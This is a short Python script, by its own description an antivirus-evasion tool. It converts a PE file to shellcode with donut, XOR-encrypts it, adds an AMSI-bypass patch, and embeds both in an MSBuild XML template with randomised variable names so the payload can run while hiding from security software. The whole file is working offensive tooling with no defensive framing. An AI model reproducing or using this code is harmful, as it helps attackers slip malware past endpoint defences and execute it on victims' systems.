#!/usr/bin/env python3

import donut
import os
import base64
import argparse
import hashlib
from itertools import cycle
import warnings
import os
import random
import re
import string
warnings.filterwarnings("ignore", category=DeprecationWarning) 


key = os.urandom(32)
def cook(data):
    temp = []
    for i in range(0, len(data)): 
        temp.append(data[i] ^ key[i % len(key)]) 
    encrypted = bytes(temp) 
    encoded = "".join(hex(x)+"," for x in encrypted)
    return encoded.strip(',')

def bake(data):    
    random.seed(hashlib.md5(data).hexdigest())    
    var_name = "".join(string.ascii_letters[random.randrange(len(string.ascii_letters))] for _ in range(0,20))
    return var_name

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Adds AV evasion to PE files)')
    parser.add_argument('infile',  type=str, help='input file (shellcode)')
    parser.add_argument('outfile',  type=str, help='output file (msbuild xml)')
    args = parser.parse_args()

    shellcode = donut.create(file=args.infile) 
    amsi_patch = cook(b"\xB8\x57\x00\x07\x80\xC3") # 64 bits
    
    with open("purbol.xml") as f:
        temp = f.read()
        temp = temp.replace('§AMSI_PATCH§',amsi_patch)        
        temp = temp.replace('§SHELLCODE§',cook(shellcode))
        key_hex = "".join(hex(x)+"," for x in key).strip(',')
        temp = temp.replace('§KEY§', key_hex)

        pattern = r"§(\S+)§"
        matches = re.finditer(pattern, temp, re.MULTILINE)        
        for matchNum, match in enumerate(matches, start=1):            
            placeholder = match.group()            
            temp = temp.replace(placeholder,bake(bytes(placeholder.replace('§',''), encoding='utf8')))
            
    with open(args.outfile, "w") as f:
        f.write(temp)    